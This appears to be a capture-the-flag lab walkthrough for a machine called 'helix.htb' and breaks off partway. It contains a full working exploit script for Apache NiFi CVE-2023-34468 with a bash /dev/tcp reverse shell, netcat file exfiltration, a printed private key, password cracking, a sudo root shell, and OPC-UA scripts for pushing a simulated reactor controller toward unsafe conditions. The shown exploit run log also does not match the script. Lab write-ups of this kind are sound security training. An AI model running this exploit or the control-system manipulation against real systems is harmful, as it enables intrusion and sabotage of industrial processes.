### Nmap
```
nmap -sV -sC -vv 10.129.42.108

---OUTPUT---
Nmap scan report for 10.129.42.108
Host is up, received echo-reply ttl 63 (0.023s latency).
Scanned at 2026-05-12 05:00:44 EDT for 8s
Not shown: 998 closed tcp ports (reset)
PORT   STATE SERVICE REASON         VERSION
22/tcp open  ssh     syn-ack ttl 63 OpenSSH 8.9p1 Ubuntu 3ubuntu0.15 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 60:b3:f7:6c:0b:92:ab:00:ac:e7:12:e1:d1:26:9c:1e (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBPTJ+LkpmuH2sQS9dhqnvmpl1NhudGQHvIxfw5Qrhj2MEU4J7VXSPAt/OPas+zeYGU8XOWgNtfnJjHEYe3XsLII=
|   256 c8:30:e6:cb:c6:cd:fc:0c:39:e5:34:04:20:07:b9:b3 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIGYnLTVO7QjbF2nWYA4R9O3DaSGllmNuBdWKKZyZxMZS
80/tcp open  http    syn-ack ttl 63 nginx 1.18.0 (Ubuntu)
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-server-header: nginx/1.18.0 (Ubuntu)
|_http-title: Did not follow redirect to http://helix.htb/
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

### Port 80

![[Pasted image 20260512050441.png]]

## FFuf 
- Reveals a subdomain `flow`:
```
ffuf -u http://helix.htb/ -w /usr/share/wordlists/SecLists/Discovery/Web-Content/big.txt   -H "Host:FUZZ.helix.htb" -fw 4

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://helix.htb/
 :: Wordlist         : FUZZ: /usr/share/wordlists/SecLists/Discovery/Web-Content/big.txt
 :: Header           : Host: FUZZ.helix.htb
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
 :: Filter           : Response words: 4
________________________________________________

flow                    [Status: 200, Size: 1068, Words: 110, Lines: 28, Duration: 1316ms]
:: Progress: [20481/20481] :: Job [1/1] :: 2000 req/sec :: Duration: [0:00:08] :: Errors: 0 ::

```
![[Pasted image 20260512050954.png]]
- On browser it opens a page saying `Did you mean /nifi` and then auto redirects to that path:
![[Pasted image 20260512051107.png]]

- Looking online we see a CVE for nifi: CVE-2023-34468
- I find a public exploit: https://github.com/Al3xx-sec/CVE-2023-34468-POC/blob/main/CVE-2023-34468_poc.py
- I use Claude to generate my own based on some links: 
	- https://www.apachecon.com/acna2024/slides/04_Firsthand%20Analysis%20of%20Apache%20NiFi%20Vulnerability%20CVE-2023-34468.pdf
	- https://www.sonicwall.com/blog/apache-nifi-code-injection-cve-2023-34468-
- My code:
```
#!/usr/bin/env python3
"""
CVE-2023-34468 - Apache NiFi H2 Connection String RCE
Affected: Apache NiFi 0.0.2 - 1.21.0

Uses INIT=CREATE ALIAS in the JDBC URL — no HTTP server required.

Usage:
    # No auth:
    python3 cve_2023_34468_nifi.py --url http://flow.helix.htb --lhost 10.10.14.X --lport 9001

    # With credentials:
    python3 cve_2023_34468_nifi.py --url http://flow.helix.htb --lhost 10.10.14.X --lport 9001 \
        --username admin --password adminpassword

    # With bearer token:
    python3 cve_2023_34468_nifi.py --url http://flow.helix.htb --lhost 10.10.14.X --lport 9001 \
        --token eyJhbGci...
"""

import argparse
import random
import string
import sys
import time
import urllib3
import requests

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)


# ── helpers ───────────────────────────────────────────────────────────────────

def rand_alnum(min_len=6, max_len=10):
    length = random.randint(min_len, max_len)
    return "".join(random.choices(string.ascii_letters + string.digits, k=length))


# ── NiFi API wrapper ──────────────────────────────────────────────────────────

class NiFiClient:
    def __init__(self, base_url: str, token: str = None, verify_ssl: bool = False):
        self.base = base_url.rstrip("/")
        self.token = token
        self.session = requests.Session()
        self.session.verify = verify_ssl

    def _headers(self):
        h = {"Content-Type": "application/json"}
        if self.token:
            h["Authorization"] = f"Bearer {self.token}"
        return h

    def api(self, method: str, path: str, **kwargs) -> requests.Response:
        url = f"{self.base}/nifi-api/{path.lstrip('/')}"
        kwargs.setdefault("headers", self._headers())
        return self.session.request(method, url, **kwargs)

    def get_revision(self, path: str) -> int:
        resp = self.api("GET", path)
        try:
            return resp.json()["revision"]["version"]
        except Exception:
            return 0

    # ── auth ──────────────────────────────────────────────────────────────────

    def login(self, username: str, password: str) -> str:
        resp = self.session.post(
            f"{self.base}/nifi-api/access/token",
            data={"username": username, "password": password},
            headers={"Content-Type": "application/x-www-form-urlencoded"},
        )
        if resp.status_code == 201:
            return resp.text.strip()
        print(f"[-] Login failed (HTTP {resp.status_code}): {resp.text[:200]}")
        return None

    def check_login_required(self):
        resp = self.api("GET", "access/config")
        if resp.status_code != 200:
            return None
        try:
            return resp.json().get("config", {}).get("supportsLogin", False)
        except Exception:
            return None

    def check_access(self):
        resp = self.api("GET", "flow/current-user")
        if resp.status_code != 200:
            print(f"[-] Could not check current user (HTTP {resp.status_code})")
            sys.exit(1)
        user = resp.json()
        identity  = user.get("identity", "unknown")
        can_write = user.get("controllerPermissions", {}).get("canWrite", False)
        print(f"[+] Identity: {identity} | canWrite: {can_write}")
        if not can_write:
            print("[-] No write access to controller services — aborting")
            sys.exit(1)

    # ── version ───────────────────────────────────────────────────────────────

    def get_version(self) -> str:
        resp = self.api("GET", "flow/about")
        if resp.status_code != 200:
            return "1.21.0"
        try:
            return resp.json()["about"]["version"]
        except Exception:
            return "1.21.0"

    # ── process group ─────────────────────────────────────────────────────────

    def get_root_process_group(self) -> str:
        resp = self.api("GET", "flow/process-groups/root")
        if resp.status_code != 200:
            return None
        try:
            return resp.json()["processGroupFlow"]["id"]
        except Exception:
            return None

    # ── DB connection pool ────────────────────────────────────────────────────

    def create_db_connection_pool(self, name: str, process_group: str, version_str: str) -> str:
        body = {
            "revision": {"version": 0},
            "component": {
                "name": name,
                "type": "org.apache.nifi.dbcp.DBCPConnectionPool",
                "bundle": {
                    "group": "org.apache.nifi",
                    "artifact": "nifi-dbcp-service-nar",
                    "version": version_str,
                },
            },
        }
        resp = self.api("POST", f"process-groups/{process_group}/controller-services", json=body)
        if resp.status_code not in (200, 201):
            print(f"[-] Failed to create DB pool (HTTP {resp.status_code}): {resp.text[:300]}")
            return None
        return resp.json()["id"]

    def configure_db_connection_pool(self, pool_id: str, pool_name: str,
                                     version_str: str, lhost: str, lport: int) -> bool:
        """
        Build JDBC URL using INIT= to run CREATE ALIAS + CALL on connection open.
        No JS engine needed — pure Java, works on all JVM versions.

        Attack chain:
            INIT= fires on connection open
                → CREATE ALIAS defines a Java method wrapping Runtime.exec()
                → CALL invokes it with the reverse shell command
        """
        java_method = (
            "String execute(String cmd) throws Exception {"
            "String[] c = new String[]{\"bash\", \"-c\", cmd};"
            "Runtime.getRuntime().exec(c);"
            "return \"EXECUTED\";"
            "}"
        )

        shell_cmd = f"bash -i >& /dev/tcp/{lhost}/{lport} 0>&1"

        # INIT= supports multiple statements separated by \;
        # Single-quotes inside the alias body must be doubled ('')
        jdbc_url = (
            "jdbc:h2:mem:testdb;"
            "TRACE_LEVEL_SYSTEM_OUT=0;"
            f"INIT=CREATE ALIAS IF NOT EXISTS RUNTIME_EXEC AS "
            f"''{java_method}''\\;"
            f"CALL RUNTIME_EXEC('{shell_cmd}')"
        )

        # Stock NiFi 1.21.0 H2 jar location
        driver_path = (
            "work/nar/extensions/nifi-poi-nar-1.21.0.nar-unpacked"
            "/NAR-INF/bundled-dependencies/h2-2.1.214.jar"
        )

        body = {
            "disconnectedNodeAcknowledged": False,
            "component": {
                "id": pool_id,
                "name": pool_name,
                "bulletinLevel": "WARN",
                "comments": "",
                "properties": {
                    "Database Connection URL":      jdbc_url,
                    "Database Driver Class Name":   "org.h2.Driver",
                    "Database Driver Location(s)":  driver_path,
                    "Max Total Connections":        "1",
                },
                "sensitiveDynamicPropertyNames": [],
            },
            "revision": {"clientId": "x", "version": 0},
        }
        resp = self.api("PUT", f"controller-services/{pool_id}", json=body)
        if resp.status_code != 200:
            print(f"[-] Failed to configure DB pool (HTTP {resp.status_code}): {resp.text[:300]}")
            return False
        return True

    def enable_db_connection_pool(self, pool_id: str) -> bool:
        v = self.get_revision(f"controller-services/{pool_id}")
        resp = self.api("PUT", f"controller-services/{pool_id}/run-status", json={
            "revision": {"version": v},
            "state": "ENABLED",
            "disconnectedNodeAcknowledged": False,
        })
        return resp.status_code in (200, 202)

    def disable_db_connection_pool(self, pool_id: str) -> bool:
        v = self.get_revision(f"controller-services/{pool_id}")
        resp = self.api("PUT", f"controller-services/{pool_id}/run-status", json={
            "revision": {"version": v},
            "state": "DISABLED",
            "disconnectedNodeAcknowledged": False,
        })
        return resp.status_code in (200, 202)

    def delete_db_connection_pool(self, pool_id: str) -> bool:
        v = self.get_revision(f"controller-services/{pool_id}")
        resp = self.api("DELETE", f"controller-services/{pool_id}?version={v}&clientId=x")
        return resp.status_code == 200

    # ── processor ─────────────────────────────────────────────────────────────

    def create_processor(self, process_group: str) -> str:
        body = {
            "revision": {"version": 0},
            "component": {
                "type": "org.apache.nifi.processors.standard.ExecuteSQL",
                "name": rand_alnum(),
                "position": {"x": random.randint(100, 800), "y": random.randint(100, 600)},
            },
        }
        resp = self.api("POST", f"process-groups/{process_group}/processors", json=body)
        if resp.status_code not in (200, 201):
            print(f"[-] Failed to create processor (HTTP {resp.status_code}): {resp.text[:300]}")
            return None
        return resp.json()["id"]

    def configure_processor(self, proc_id: str, pool_id: str) -> bool:
        v = self.get_revision(f"processors/{proc_id}")
        body = {
            "component": {
                "id": proc_id,
                "name": rand_alnum(),
                "config": {
                    "autoTerminatedRelationships": ["failure", "success"],
                    "bulletinLevel": "WARN",
                    "concurrentlySchedulableTaskCount": "1",
                    "executionNode": "ALL",
                    "penaltyDuration": "30 sec",
                    "schedulingPeriod": "0 sec",
                    "schedulingStrategy": "TIMER_DRIVEN",
                    "yieldDuration": "1 sec",
                    "properties": {
                        "Database Connection Pooling Service": pool_id,
                        # Innocuous query — payload fires via INIT= on connection open
                        "SQL select query": "SELECT H2VERSION() FROM DUAL;",
                    },
                },
            },
            "revision": {"clientId": "x", "version": v},
        }
        resp = self.api("PUT", f"processors/{proc_id}", json=body)
        if resp.status_code != 200:
            print(f"[-] Failed to configure processor (HTTP {resp.status_code}): {resp.text[:300]}")
            return False
        return True

    def start_processor(self, proc_id: str) -> bool:
        v = self.get_revision(f"processors/{proc_id}")
        resp = self.api("PUT", f"processors/{proc_id}/run-status", json={
            "revision": {"version": v},
            "state": "RUNNING",
            "disconnectedNodeAcknowledged": False,
        })
        return resp.status_code in (200, 202)

    def stop_processor(self, proc_id: str) -> bool:
        v = self.get_revision(f"processors/{proc_id}")
        resp = self.api("PUT", f"processors/{proc_id}/run-status", json={
            "revision": {"version": v},
            "state": "STOPPED",
            "disconnectedNodeAcknowledged": False,
        })
        return resp.status_code in (200, 202)

    def delete_processor(self, proc_id: str) -> bool:
        v = self.get_revision(f"processors/{proc_id}")
        resp = self.api("DELETE", f"processors/{proc_id}?version={v}&clientId=x")
        return resp.status_code == 200


# ── main exploit flow ─────────────────────────────────────────────────────────

def exploit(args):
    client = NiFiClient(args.url)

    # ── 1. Auth ───────────────────────────────────────────────────────────────
    print("[*] Checking authentication requirement...")
    login_required = client.check_login_required()
    if login_required is None:
        print("[-] Could not contact the NiFi API — check the URL.")
        sys.exit(1)

    if login_required:
        if args.token:
            client.token = args.token
            print("[+] Using supplied bearer token.")
        elif args.username and args.password:
            print(f"[*] Logging in as {args.username}...")
            client.token = client.login(args.username, args.password)
            if not client.token:
                print("[-] Authentication failed.")
                sys.exit(1)
            print("[+] Authenticated successfully.")
        else:
            print("[-] Instance requires auth. Supply --token OR --username+--password.")
            sys.exit(1)
    else:
        print("[+] Instance is open (no auth required).")

    # ── 2. Access check ───────────────────────────────────────────────────────
    client.check_access()

    # ── 3. Version ────────────────────────────────────────────────────────────
    version_str = client.get_version()
    print(f"[+] NiFi version: {version_str}")

    # ── 4. Root process group ─────────────────────────────────────────────────
    print("[*] Fetching root process group...")
    root_pg = client.get_root_process_group()
    if not root_pg:
        print("[-] Could not retrieve root process group.")
        sys.exit(1)
    print(f"[+] Root process group: {root_pg}")

    # ── 5. Create DB connection pool ──────────────────────────────────────────
    pool_name = rand_alnum()
    print(f"[*] Creating DB connection pool '{pool_name}'...")
    pool_id = client.create_db_connection_pool(pool_name, root_pg, version_str)
    if not pool_id:
        sys.exit(1)
    print(f"[+] Pool ID: {pool_id}")

    # ── 6. Configure pool with INIT=CREATE ALIAS payload ─────────────────────
    print("[*] Configuring DB pool with INIT=CREATE ALIAS payload...")
    if not client.configure_db_connection_pool(pool_id, pool_name, version_str,
                                                args.lhost, args.lport):
        sys.exit(1)
    print("[+] Pool configured.")

    # ── 7. Create & configure ExecuteSQL processor ────────────────────────────
    print("[*] Creating ExecuteSQL processor...")
    proc_id = client.create_processor(root_pg)
    if not proc_id:
        sys.exit(1)
    print(f"[+] Processor ID: {proc_id}")

    print("[*] Configuring processor...")
    if not client.configure_processor(proc_id, pool_id):
        sys.exit(1)
    print("[+] Processor configured.")

    # ── 8. Enable pool — INIT= fires on first connection open ─────────────────
    print("[*] Enabling DB connection pool...")
    if not client.enable_db_connection_pool(pool_id):
        print("[-] Could not enable pool — may still fire, check your listener.")
    else:
        print("[+] Pool enabled.")
    time.sleep(2)

    # ── 9. Start processor — opens connection, triggers INIT= ─────────────────
    print("[*] Starting processor...")
    if client.start_processor(proc_id):
        print(f"[+] Processor running — waiting {args.delay}s for shell on :{args.lport}...")
    print(f"\n    *** Listener:  nc -lvnp {args.lport}  ***\n")
    time.sleep(args.delay)

    # ── 10. Cleanup ───────────────────────────────────────────────────────────
    if not args.no_cleanup:
        print("[*] Cleaning up...")
        client.stop_processor(proc_id)
        time.sleep(2)
        if client.delete_processor(proc_id):
            print(f"[+] Deleted processor {proc_id}")
        client.disable_db_connection_pool(pool_id)
        time.sleep(3)
        if client.delete_db_connection_pool(pool_id):
            print(f"[+] Deleted DB pool {pool_id}")
    else:
        print(f"[!] Skipping cleanup — processor: {proc_id} | pool: {pool_id}")

    print("[*] Done.")


# ── entry point ───────────────────────────────────────────────────────────────

def main():
    parser = argparse.ArgumentParser(
        description="CVE-2023-34468 — Apache NiFi H2 INIT=CREATE ALIAS RCE"
    )
    parser.add_argument("--url",        required=True, help="Target base URL, e.g. http://flow.helix.htb")
    parser.add_argument("--lhost",      required=True, help="Your listener IP")
    parser.add_argument("--lport",      required=True, type=int, help="Your listener port")
    parser.add_argument("--username",   default="",    help="NiFi username (if auth required)")
    parser.add_argument("--password",   default="",    help="NiFi password (if auth required)")
    parser.add_argument("--token",      default="",    help="Pre-obtained bearer token")
    parser.add_argument("--delay",      default=30,    type=int,
                        help="Seconds to wait before cleanup (default: 30)")
    parser.add_argument("--no-cleanup", action="store_true",
                        help="Skip cleanup (useful for debugging)")
    args = parser.parse_args()

    exploit(args)


if __name__ == "__main__":
    main()

```

- With a netcat listener I pass the command to get a shell as user `nifi`:
```
python3 exploit2.py --target http://flow.helix.htb \
    --lhost 10.10.17.167 \
    --lport 9999
    
---OUTPUT---
[*] Target: http://flow.helix.htb | LHOST: 10.10.17.167:9999 | HTTP: 80
[*] HTTP server up on :80
[*] Checking access...
[+] Identity: anonymous | Anonymous: True | canWrite: True
[+] Target is exploitable
[*] Getting root process group ID...
[+] PG ID: f203bc07-019b-1000-516b-eaedd48609d1
[*] Creating DBCPConnectionPool...
[+] rce.sql delivered to target
[+] CS ID: 1b9e5cf9-019e-1000-f99e-f5a74aaa3eaf
[*] Enabling controller service...
[+] Controller service enabled
[*] Creating ExecuteSQL processor...
[+] Processor ID: 1b9e682a-019e-1000-4b25-49aeea4d034a
[*] Starting processor...
[+] Processor running — waiting for shell on port 4444...
[+] rce.sql delivered to target
[+] rce.sql delivered to target
[+] rce.sql delivered to target
[+] rce.sql delivered to target
[+] rce.sql delivered to target
[+] rce.sql delivered to target
[+] rce.sql delivered to target
[+] rce.sql delivered to target
[+] rce.sql delivered to target
[+] rce.sql delivered to target
...
```
![[Pasted image 20260512081717.png]]
![[Pasted image 20260512081600.png]]

- Looking around I find a private key for user `operator`(home directory available):
```
cat operator*
-----BEGIN OPENSSH PRIVATE KEY-----
b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAAAMwAAAAtzc2gtZW
QyNTUxOQAAACDouEevtXQL5puMEPQzMGEo/LSrbETsWVDH8B41VHNbOwAAAJhCUmdYQlJn
WAAAAAtzc2gtZWQyNTUxOQAAACDouEevtXQL5puMEPQzMGEo/LSrbETsWVDH8B41VHNbOw
AAAEBWd4qZPQ48ePEdHec/Fquwu8Apm+TkeJJTwODupeRtwui4R6+1dAvmm4wQ9DMwYSj8
tKtsROxZUMfwHjVUc1s7AAAAD3Jvb3RAbWFuYWdlbWVudAECAwQFBg==
-----END OPENSSH PRIVATE KEY-----

```
![[Pasted image 20260512081653.png]]

- I copy the key locally and set the right permissions and manage to log in to target as user `operator`
```
vi id_ed25519
chmod 0600 id_ed25519
ssh operator@helix.htb -i id_ed25519
```
![[Pasted image 20260512081904.png]]

- I find a pdf `Operator Control and Safety Guide`. I get it to my local machine
```
---Locally---
nc -lvnp 9999 > Operator Control and Safety Guide.pdf

---TARGET---
nc 10.10.17.167 9999 < Operator Control and Safety Guide
```
- It is password protected so I extract the hash and crack it:
```
pdf2john Operator\ Control\ \&\ Safety\ Guide.pdf 

Operator Control & Safety Guide.pdf:$pdf$5*6*256*-4*1*16*7c46c5fed97042269c802d39f7ba411b*48*a3bf8039a5f2a39d85b611b374b74debe6be3aa6f01dc1a6e8dd5cd4157499f9a3efe04ca0c999bcac23d7efd22e8366*48*c8909cc91d0fa3d97bf1ce139c46df1936b2b9dc15a305a659d5eb2b1c3172da04ddf8efbfea0a98b3e5043e883ab3e7*32*d3e8e21436f4263214102eebcf3a51d2a4e5049fc2e2aaf50e594ce952db7011*32*a3b05cab12d5403fb8e96415a023560c9453cea981ddbb72d92650c0933785b5
```
![[Pasted image 20260512082114.png]]

- I copy the hash (from `$pdf$`) and crack it:
```
john hash --wordlist=/usr/share/wordlists/rockyou.txt 
Using default input encoding: UTF-8
Loaded 1 password hash (PDF [MD5 SHA2 RC4/AES 32/64])
Cost 1 (revision) is 6 for all loaded hashes
Will run 4 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
operator1        (?)     
1g 0:00:01:08 DONE (2026-05-12 06:09) 0.01470g/s 3882p/s 3882c/s 3882C/s orphee..olivetree
Use the "--show --format=PDF" options to display all of the cracked passwords reliably
Session completed.
```
![[Pasted image 20260512082156.png]]

- The password is `operator1`

- On reading it it displays information about a tool. Looking at `sudo` privileges we see there is a command we can execute:
```
sudo -l                                                                                                    
Matching Defaults entries for operator on helix:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin,
    use_pty

User operator may run the following commands on helix:
    (root) NOPASSWD: /usr/local/sbin/helix-maint-console
```
![[Pasted image 20260512082339.png]]

- From the pdf, it states there are 3 variables monitored: Temperature, pressure and Calibration offset
	- There are 3 safety variables : TripActive, RodINsterted and EmergencyCooling
	- Finally there are 3 control variables: mode which can be normal or maintenance, testoverride and reset trip
- Normal mode calibration offset is 0 and any attempt to chagne wil be denied by PLC
- When temperature is >or = 305 and pressure > or = 75 safety trip mechanism happens where control logic gets locked and tripactive value becomes true.
	- Operator inputs are this restricted and safety machnisms take precedence
- A PLC will onyl reset if the following conditions are met:
```
The PLC will only accept a reset if all of the following conditions are met:
• Reactor temperature is below \~288°C
• Reactor pressure is below \~70 bar
• Operating mode is NORMAL
• TestOverride is disabled
• CalibrationOffset is reset to 0.0
```
- To get to Maintenance mode :
```
1. Switch Mode to MAINTENANCE
2. Enable TestOverride
3. Begin controlled adjustment using CalibrationOffset
```

- Finally to access the maintenance operating window:
```
This window opens when:
• Temperature reaches approximately **295°C OR Pressure 73 bar
• Pressure & Temp remains below trip thresholds
• No safety trip is active
This window exists below trip limits but above normal operating conditions.
```

- However if the values are changed too fast it wont be registered:
```
When CalibrationOffset is increased gradually:
• Temperature rises predictably
• Pressure increases slowly and remains tightly constrained
• Safety logic continuously monitors trip thresholds
If the offset is increased too aggressively:
• The PLC will trigger a safety trip
• CalibrationOffset changes are immediately ignored
Operators are expected to ramp offsets slowly and observe system feedback.
```

- When passing the sudo comand it says maintenance window is closed.

- Reading the code:
```
#!/bin/bash
set -euo pipefail

FLAG="/opt/helix/state/maintenance_window"

read_until() { cat "$FLAG" 2>/dev/null || true; }

window_ok() {
  [ -f "$FLAG" ] || return 1
  local until_ts now
  until_ts="$(read_until)"
  now="$(date +%s)"
  [[ "$until_ts" =~ ^[0-9]+$ ]] || return 1
  [ "$now" -lt "$until_ts" ] || return 1
  return 0
}

if ! window_ok; then
  echo "Maintenance window CLOSED."
  exit 1
fi

until_ts="$(read_until)"
now="$(date +%s)"
remaining=$((until_ts-now))

echo "[+] Privileged maintenance access granted"
echo "[!] Window expires in ${remaining} seconds"
echo "[!] Session will be terminated automatically"

# Unique scope name
SCOPE="helix-maint-$$"

# Launch an interactive root shell attached to THIS TTY, in its own systemd scope
systemd-run --quiet --scope --unit="$SCOPE" --property=KillMode=control-group --property=SendSIGHUP=yes \
  /bin/bash -p -i

# If systemd-run returns, the shell exited.
exit 0

```

- It seems it will open a shell as root in maintenance window.
- Now we need to find the endpoint.

- Looking at open ports we see 8080 and 8081
- passing curl command to 8080 gives nifi and 8081 gives helix:
```
curl -s http://127.0.0.1:8081

<!doctype html><html><head>
<title>Helix HMI — Reactor Panel</title>
<style>
body{font-family:Arial;margin:28px;background:#0b0f14;color:#e6edf3}
.card{padding:16px;border:1px solid #233045;border-radius:12px;margin-bottom:12px}
.row{display:flex;gap:12px}.row .card{flex:1}
.ok{color:#3fb950}.bad{color:#f85149}.warn{color:#d29922}
code{background:#111826;padding:2px 6px;border-radius:8px}
small{opacity:.75}
hr{border:0;border-top:1px solid #233045;margin:12px 0}
</style></head><body>
<h1>Helix Industries — Reactor HMI</h1>
<small>Maintenance window is NOT the same as MAINTENANCE mode. Window opens only when safety controller authorizes it under hazardous test conditions.</small>
<hr>

<div class="row">
  <div class="card">
    <h2>Reactor</h2>
    <p>Temperature: <b class="ok">278.4 °C</b></p>
    <p>Pressure: <b class="ok">68.73 bar</b></p>
    <p><small>Raw Temp: 278.4 °C | CalibrationOffset: 0.0 °C</small></p>
  </div>

  <div class="card">
    <h2>Safety</h2>
    <p>Trip Active: <b class="ok">False</b></p>
    <p>Rods Inserted: <b class="bad">False</b></p>
    <p>Emergency Cooling: <b class="bad">False</b></p>
  </div>

  <div class="card">
    <h2>Control</h2>
    <p>Mode: <code>NORMAL</code></p>
    <p>Test Override: <code>False</code></p>
    <p>Test Mode Active: <b class="ok">NO</b></p>
    <p><small>OPC UA (internal): <code>opc.tcp://127.0.0.1:4840/helix/</code></small></p>
  </div>
</div>

<div class="card">
  <h2>Privileged Maintenance Window</h2>
  <p>Status:
    <b class="warn">
      CLOSED
    </b>
    
  </p>
  
    <p><small>No maintenance window file present.</small></p>
  
  <p><small>
    This window is granted by the safety controller only when a hazardous test condition is detected (e.g., Temp ≥ 295°C or Pressure ≥ 73 bar) while still below trip.
  </small></p>
</div>

<script>setTimeout(()=>location.reload(), 1500);</script>
```
![[Pasted image 20260512085349.png]]

- It also gives the url for the OPC-UA control: `127.0.0.1:4840/helix/`

- - I try to find the node:
- browse.py:
```
import asyncio
from asyncua import Client

async def main():
    async with Client("opc.tcp://127.0.0.1:4840/helix/") as client:
        root = client.get_root_node()
        children = await root.get_children()
        for node in children:
            name = await node.read_browse_name()
            print(f"{node} — {name}")
            grandchildren = await node.get_children()
            for child in grandchildren:
                cname = await child.read_browse_name()
                print(f"  {child} — {cname}")
                greatgrandchildren = await child.get_children()
                for gc in greatgrandchildren:
                    gcname = await gc.read_browse_name()
                    print(f"    {gc} — {gcname}")

asyncio.run(main())
```

- Running it I find Plant > Reactor Safety Control at `ns=2i=`
```
python3 browse.py

---OUTPUT_--
i=85 — QualifiedName(NamespaceIndex=0, Name='Objects')
  i=31915 — QualifiedName(NamespaceIndex=0, Name='Locations')
  i=2253 — QualifiedName(NamespaceIndex=0, Name='Server')
    i=2254 — QualifiedName(NamespaceIndex=0, Name='ServerArray')
    i=2255 — QualifiedName(NamespaceIndex=0, Name='NamespaceArray')
    i=15004 — QualifiedName(NamespaceIndex=0, Name='UrisVersion')
    i=2256 — QualifiedName(NamespaceIndex=0, Name='ServerStatus')
    i=2267 — QualifiedName(NamespaceIndex=0, Name='ServiceLevel')
    i=2994 — QualifiedName(NamespaceIndex=0, Name='Auditing')
    i=12885 — QualifiedName(NamespaceIndex=0, Name='EstimatedReturnTime')
    i=17634 — QualifiedName(NamespaceIndex=0, Name='LocalTime')
    i=2268 — QualifiedName(NamespaceIndex=0, Name='ServerCapabilities')
    i=2274 — QualifiedName(NamespaceIndex=0, Name='ServerDiagnostics')
    i=2295 — QualifiedName(NamespaceIndex=0, Name='VendorServerInfo')
    i=2296 — QualifiedName(NamespaceIndex=0, Name='ServerRedundancy')
    i=11715 — QualifiedName(NamespaceIndex=0, Name='Namespaces')
    i=11492 — QualifiedName(NamespaceIndex=0, Name='GetMonitoredItems')
    i=12873 — QualifiedName(NamespaceIndex=0, Name='ResendData')
    i=12749 — QualifiedName(NamespaceIndex=0, Name='SetSubscriptionDurable')
    i=12886 — QualifiedName(NamespaceIndex=0, Name='RequestServerStateChange')
    i=17594 — QualifiedName(NamespaceIndex=0, Name='Dictionaries')
    i=32530 — QualifiedName(NamespaceIndex=0, Name='Quantities')
    i=32637 — QualifiedName(NamespaceIndex=0, Name='DefaultHAConfiguration')
    i=32754 — QualifiedName(NamespaceIndex=0, Name='DefaultHEConfiguration')
    i=12637 — QualifiedName(NamespaceIndex=0, Name='ServerConfiguration')
    i=14443 — QualifiedName(NamespaceIndex=0, Name='PublishSubscribe')
    i=24226 — QualifiedName(NamespaceIndex=0, Name='Resources')
  i=23470 — QualifiedName(NamespaceIndex=0, Name='Aliases')
    i=23476 — QualifiedName(NamespaceIndex=0, Name='FindAlias')
    i=32852 — QualifiedName(NamespaceIndex=0, Name='LastChange')
    i=23479 — QualifiedName(NamespaceIndex=0, Name='TagVariables')
    i=23488 — QualifiedName(NamespaceIndex=0, Name='Topics')
  ns=2;i=1 — QualifiedName(NamespaceIndex=2, Name='Plant')
    ns=2;i=2 — QualifiedName(NamespaceIndex=2, Name='Reactor')
    ns=2;i=7 — QualifiedName(NamespaceIndex=2, Name='Safety')
    ns=2;i=11 — QualifiedName(NamespaceIndex=2, Name='Control')
i=86 — QualifiedName(NamespaceIndex=0, Name='Types')
  i=88 — QualifiedName(NamespaceIndex=0, Name='ObjectTypes')
    i=58 — QualifiedName(NamespaceIndex=0, Name='BaseObjectType')
  i=89 — QualifiedName(NamespaceIndex=0, Name='VariableTypes')
    i=62 — QualifiedName(NamespaceIndex=0, Name='BaseVariableType')
  i=90 — QualifiedName(NamespaceIndex=0, Name='DataTypes')
    i=92 — QualifiedName(NamespaceIndex=0, Name='XML Schema')
    i=93 — QualifiedName(NamespaceIndex=0, Name='OPC Binary')
    i=24 — QualifiedName(NamespaceIndex=0, Name='BaseDataType')
  i=91 — QualifiedName(NamespaceIndex=0, Name='ReferenceTypes')
    i=31 — QualifiedName(NamespaceIndex=0, Name='References')
  i=3048 — QualifiedName(NamespaceIndex=0, Name='EventTypes')
    i=2041 — QualifiedName(NamespaceIndex=0, Name='BaseEventType')
  i=17708 — QualifiedName(NamespaceIndex=0, Name='InterfaceTypes')
    i=17602 — QualifiedName(NamespaceIndex=0, Name='BaseInterfaceType')
i=87 — QualifiedName(NamespaceIndex=0, Name='Views')
```

![[Pasted image 20260512085254.png]]
- Now to find the CallibrationOffset node:
- browse2.py
```
import asyncio
from asyncua import Client

async def main():
    async with Client("opc.tcp://127.0.0.1:4840/helix/") as client:
        for node_id in ["ns=2;i=2", "ns=2;i=7", "ns=2;i=11"]:
            node = client.get_node(node_id)
            name = await node.read_browse_name()
            print(f"\n[{name.Name}]")
            children = await node.get_children()
            for child in children:
                cname = await child.read_browse_name()
                try:
                    val = await child.read_value()
                except:
                    val = "(not readable)"
                print(f"  {child} — {cname.Name} = {val}")

asyncio.run(main())
```

- Running it :
```
python3 browse2,.py

---OUTPUT---

[Reactor]
  ns=2;i=3 — TemperatureRaw = 283.99989996240276
  ns=2;i=4 — Temperature = 283.99989996240276
  ns=2;i=5 — Pressure = 68.99995462557472
  ns=2;i=6 — CalibrationOffset = 0.0

[Safety]
  ns=2;i=8 — RodsInserted = False
  ns=2;i=9 — EmergencyCooling = False
  ns=2;i=10 — TripActive = False

[Control]
  ns=2;i=12 — Mode = NORMAL
  ns=2;i=13 — TestOverride = False
  ns=2;i=14 — ResetTrip = False
```
![[Pasted image 20260512085055.png]]

- Now from the documentation I pass the following codes. First I reset (as i made some mistakes earlier)
- reset.py
```
import asyncio
from asyncua import Client

async def main():
    async with Client("opc.tcp://127.0.0.1:4840/helix/") as client:
        # Reset calibration offset
